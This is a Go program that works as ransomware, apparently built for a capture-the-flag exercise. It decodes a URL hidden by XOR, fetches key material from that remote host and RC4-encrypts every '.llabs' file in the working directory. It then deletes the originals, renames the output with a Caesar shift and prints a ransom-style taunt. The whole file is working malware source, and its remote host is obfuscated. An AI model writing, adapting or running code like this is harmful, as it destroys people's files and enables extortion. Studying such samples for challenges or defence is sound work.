package main

import (
  "crypto/rc4"
  "crypto/sha512"
  "encoding/hex"
  "fmt"
  "io/ioutil"
  "net/http"
  "os"
  "path/filepath"
  "regexp"
)

const lowerCaseAlphabet = "abcdefghijklmnopqrstuvwxyz"
const upperCaseAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

func findFilesWithExt(ext string) []string {
  pathS, err := os.Getwd()
  if err != nil {
    panic(err)
  }
  var files []string
  filepath.Walk(pathS, func(path string, f os.FileInfo, _ error) error {
    if !f.IsDir() {
      r, err := regexp.MatchString(ext, f.Name())
      if err == nil && r {
        files = append(files, f.Name())
      }
    }
    return nil
  })
  return files
}

// EncryptDecrypt runs a XOR encryption on the input string, encrypting it if it hasn't already been,
// and decrypting it if it has, using the key provided.
func encryptDecryptXor(input string, key byte) (output string) {
  for i := 0; i < len(input); i++ {
    output += string(input[i] ^ key)
  }
  return output
}

func encryptCaesar(plaintext string, key int) string {
  return rotateText(plaintext, key)
}

func decryptCaesar(ciphertext string, key int) string {
  return rotateText(ciphertext, -key)
}

// Takes a string and rotates each character by the provided amount.
func rotateText(inputText string, rot int) string {
  rot %= 26
  rotatedText := []byte(inputText)

  for index, byteValue := range rotatedText {
    if byteValue >= 'a' && byteValue <= 'z' {
      rotatedText[index] = lowerCaseAlphabet[(int((26+(byteValue-'a')))+rot)%26]
    } else if byteValue >= 'A' && byteValue <= 'Z' {
      rotatedText[index] = upperCaseAlphabet[(int((26+(byteValue-'A')))+rot)%26]
    }
  }
  return string(rotatedText)
}

func getMd5HashByte(data []byte) []byte {
  hash := sha512.Sum512(data)
  return (hash[13:29])
}

func fetchKey(url string) []byte {
  //resp, err := http.Get(url)
  client := &http.Client{}

  req, err := http.NewRequest("GET", url, nil)
  if err != nil {
    panic(err)
  }

  req.Header.Set("User-Agent", "DEADFACE-LLABS-CRYPTOWARE/6.66")

  resp, err := client.Do(req)
  if err != nil {
    panic(err)
  }

  //defer resp.Body.Close()

  body, err := ioutil.ReadAll(resp.Body)

  if err != nil {
    panic(err)
  }

  resp.Body.Close()
  hash_key := getMd5HashByte(body)

  return  hash_key
}

func encryptRc4(text []byte, key []byte) ([]byte, error) {
  c, err := rc4.NewCipher(key)
  src := text
  dst := make([]byte, len(src))
  if err != nil {
    return dst, err
  }

  c.XORKeyStream(dst, src)
  return dst, nil
}

func main() {
  // Decrypt URL with XOR(Z)
  urlEncrypted, _ := hex.DecodeString("322e2e2a607575333429333e33352f29743e3f3b3e3c3b393f743335752a283f2e2e2377363b3e23743d333c")
  url := encryptDecryptXor(string(urlEncrypted), byte('Z'))
  //fmt.Println("URL = " + url)

  // Download the web item (key material)
  fileKey := fetchKey(url)
  //fmt.Println("File Key = " + hex.EncodeToString(fileKey))
  fmt.Println("Pinkie Print = " + hex.EncodeToString(fileKey[0:2]) + ":" + hex.EncodeToString(fileKey[14:16]))

  // Find all files in the current directory that match the
  // extension pattern
  fileList := findFilesWithExt(".llabs")

  // Loop through the ALP files.  Encrypt them, then write out
  // the data with a CAESAR(3) encrypted file name.
  // Remove the original file.
  for _, fileName := range fileList {
    encFileName := encryptCaesar(fileName, 3)

    fileData, _ := os.ReadFile(fileName)
    encryptedFileData, _ := encryptRc4(fileData, fileKey)
    os.WriteFile(encFileName, encryptedFileData, 0644)
    os.Remove(fileName)
  }

  fmt.Println("LYTTON LABS: Your sins have finally caught up to you!  Your files have been encrypted!")
}
